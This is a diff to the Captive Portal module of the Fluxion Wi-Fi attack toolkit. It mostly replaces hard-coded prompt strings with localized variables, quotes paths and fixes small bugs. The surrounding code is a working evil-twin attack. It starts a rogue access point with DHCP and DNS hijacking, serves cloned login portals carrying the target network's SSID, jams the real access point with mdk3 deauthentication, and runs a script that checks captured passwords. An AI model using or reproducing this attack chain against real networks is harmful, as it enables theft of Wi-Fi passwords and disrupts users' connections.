@@ -46,18 +46,18 @@ function captive_portal_set_auth() {
 	else
 		fluxion_header
 
-		echo -e "$FLUXIONVLine $header_askauth"
+		echo -e "$FLUXIONVLine $CaptivePortalVerificationMethodQuery"
 		echo
 
 		view_target_ap_info
 
-		local choices=("${CaptivePortalAuthenticationMethods[@]}" "$general_back")
+		local choices=("${CaptivePortalAuthenticationMethods[@]}" "$FLUXIONGeneralBackOption")
 		io_query_format_fields "" "\t$CRed[$CYel%d$CRed]$CClr %b %b\n" choices[@] \
 										CaptivePortalAuthenticationMethodsInfo[@]
 
 		APRogueAuthMode="${IOQueryFormatFields[0]}"
 
-		if [[ "$APRogueAuthMode" = "$general_back" ]]; then
+		if [[ "$APRogueAuthMode" = "$FLUXIONGeneralBackOption" ]]; then
 			unset_ap_service
 			captive_portal_unset_auth
 			return 1
@@ -97,15 +97,15 @@ function captive_portal_set_cert() {
 
 	captive_portal_unset_cert
 
-	local choices=("$DialogOptionCertificateSource1" "$DialogOptionCertificateSource2" "$general_back")
+	local choices=("$CaptivePortalCertificateSourceGenerateOption" "$CaptivePortalCertificateSourceRescanOption" "$FLUXIONGeneralBackOption")
 
 	while [ ! -f "$FLUXIONWorkspacePath/server.pem" -o ! -s "$FLUXIONWorkspacePath/server.pem" ]; do
-		io_query_choice "$DialogQueryCertificateSource" choices[@]
+		io_query_choice "$CaptivePortalCertificateSourceQuery" choices[@]
 
 		case "$IOQueryChoice" in
-			"$DialogOptionCertificateSource1") captive_portal_run_certificate_generator; break;;
-			"$DialogOptionCertificateSource2") return 2;;
-			"$general_back")
+			"$CaptivePortalCertificateSourceGenerateOption") captive_portal_run_certificate_generator; break;;
+			"$CaptivePortalCertificateSourceRescanOption") return 2;;
+			"$FLUXIONGeneralBackOption")
 				captive_portal_unset_auth
 				captive_portal_unset_cert
 				return 1;;
@@ -132,7 +132,7 @@ function captive_portal_set_site() {
 		return 0;
 	fi
 
-	captive_portal_unset_interface
+	captive_portal_unset_site
 
 	local sites
 
@@ -141,19 +141,19 @@ function captive_portal_set_site() {
 	for site in attacks/Captive\ Portal/sites/generic/* attacks/Captive\ Portal/sites/*.portal; do
 		site="${site/attacks\/Captive\ Portal\/sites\//}"
 		if [[ "$site" != *.portal ]]; then
-			site="${DialogOptionCaptivePortalGeneric}_${site/generic\//}"
+			site="${CaptivePortalGenericInterfaceOption}_${site/generic\//}"
 		fi
 		sites[${#sites[@]}]="${site/.portal/}"
 	done
 
-	local sitesIdentifier=("${sites[@]/_*/}" "$general_back")
+	local sitesIdentifier=("${sites[@]/_*/}" "$FLUXIONGeneralBackOption")
 	local sitesLanguage=("${sites[@]/*_/}")
 
 	fluxion_header
 
 	view_target_ap_info
 
-	io_query_format_fields "$FLUXIONVLine $DialogQueryCaptivePortalInterface" \
+	io_query_format_fields "$FLUXIONVLine $CaptivePortalInterfaceQuery" \
 						"$CRed[$CYel%02d$CRed]$CClr %-38b $CBlu[%10s]$CClr\n" \
 						sitesIdentifier[@] sitesLanguage[@]
 
@@ -162,17 +162,17 @@ function captive_portal_set_site() {
 	local sitePath="${site}_${siteLanguage}"
 
 	case "$site" in
-		"$DialogOptionCaptivePortalGeneric")
+		"$CaptivePortalGenericInterfaceOption")
 			source "$FLUXIONPath/attacks/Captive Portal/sites/generic/$siteLanguage"
 			captive_portal_generic;;
-		"$general_back")
+		"$FLUXIONGeneralBackOption")
 			captive_portal_unset_cert
 			captive_portal_unset_site
 			return 1;;
 		* )
-			mkdir "$FLUXIONWorkspacePath/captive_portal" &>$FLUXIONOutputDevice
-			cp -r $FLUXIONPath/attacks/Captive\ Portal/sites/$sitePath.portal/* \
-				  $FLUXIONWorkspacePath/captive_portal
+			# mkdir "$FLUXIONWorkspacePath/captive_portal" &>$FLUXIONOutputDevice
+			cp -r "$FLUXIONPath/attacks/Captive Portal/sites/$sitePath.portal" \
+				  "$FLUXIONWorkspacePath/captive_portal"
 			find "$FLUXIONWorkspacePath/captive_portal/" -type f -exec \
 				 sed -i -e 's/$APTargetSSID/'"$APTargetSSID"'/g' {} \;
 			find "$FLUXIONWorkspacePath/captive_portal/" -type f -exec \
@@ -188,8 +188,9 @@ function captive_portal_unset_attack() {
 	sandbox_remove_workfile "$FLUXIONWorkspacePath/lighttpd.conf"
 	sandbox_remove_workfile "$FLUXIONWorkspacePath/dhcpd.leases"
 	sandbox_remove_workfile "$FLUXIONWorkspacePath/captive_portal/check.php"
+	sandbox_remove_workfile "$FLUXIONWorkspacePath/captive_portal"
 
-	# Only reset the AP if one has been define.	
+	# Only reset the AP if one has been defined.	
 	if [ $(type -t ap_reset) ]; then
 		ap_reset
 	fi
@@ -843,31 +844,31 @@ function start_attack() {
 
 	stop_attack
 
-	echo -e "$FLUXIONVLine Starting Captive Portal access point service..."
+	echo -e "$FLUXIONVLine $CaptivePortalStaringAPServiceNotice"
 	ap_start
 
-	echo -e "$FLUXIONVLine Starting Captive Portal access point routes..."
+	echo -e "$FLUXIONVLine $CaptivePortalStaringAPRoutesNotice"
 	captive_portal_set_routes &
 	sleep 3
 
     fuser -n tcp -k 53 67 80 443 &> $FLUXIONOutputDevice
     fuser -n udp -k 53 67 80 443 &> $FLUXIONOutputDevice
 
-	echo -e "$FLUXIONVLine Starting access point DHCP service as daemon..."
+	echo -e "$FLUXIONVLine $CaptivePortalStartingDHCPServiceNotice"
 	xterm -bg black -fg green $TOPLEFT -title "FLUXION AP DHCP Service" -e dhcpd -d -f -lf "$FLUXIONWorkspacePath/dhcpd.leases" -cf "$FLUXIONWorkspacePath/dhcpd.conf" $VIGW 2>&1 | tee -a "$FLUXIONWorkspacePath/clients.txt" &
 
-	echo -e "$FLUXIONVLine Starting access point DNS service as daemon..."
+	echo -e "$FLUXIONVLine $CaptivePortalStartingDNSServiceNotice"
     xterm $BOTTOMLEFT -bg "#000000" -fg "#99CCFF" -title "FLUXION AP DNS Service" -e "if type python2 >/dev/null 2>/dev/null; then python2 \"$FLUXIONWorkspacePath/fluxion_captive_portal_dns\"; else python \"$FLUXIONWorkspacePath/fluxion_captive_portal_dns\"; fi" &
 
-	echo -e "$FLUXIONVLine Starting access point captive portal as daemon..."
+	echo -e "$FLUXIONVLine $CaptivePortalStartingWebServiceNotice"
     lighttpd -f "$FLUXIONWorkspacePath/lighttpd.conf" &> $FLUXIONOutputDevice
 	CaptivePortalServerPID=$!
 
-	echo -e "$FLUXIONVLine Starting access point jammer as daemon..."
+	echo -e "$FLUXIONVLine $CaptivePortalStartingJammerServiceNotice"
     echo -e "$APTargetMAC" > "$FLUXIONWorkspacePath/mdk3_blacklist.lst"
     xterm $FLUXIONHoldXterm $BOTTOMRIGHT -bg "#000000" -fg "#FF0009" -title "FLUXION AP Jammer [mdk3]  $APTargetSSID" -e mdk3 $WIMonitor d -b "$FLUXIONWorkspacePath/mdk3_blacklist.lst" -c $APTargetChannel &
 
-	echo -e "$FLUXIONVLine Starting authenticator script..."
+	echo -e "$FLUXIONVLine $CaptivePortalStartingAuthenticatorServiceNotice"
     xterm -hold $TOPRIGHT -title "FLUXION AP Authenticator" -e "$FLUXIONWorkspacePath/captive_portal_authenticator.sh" &
 }
 
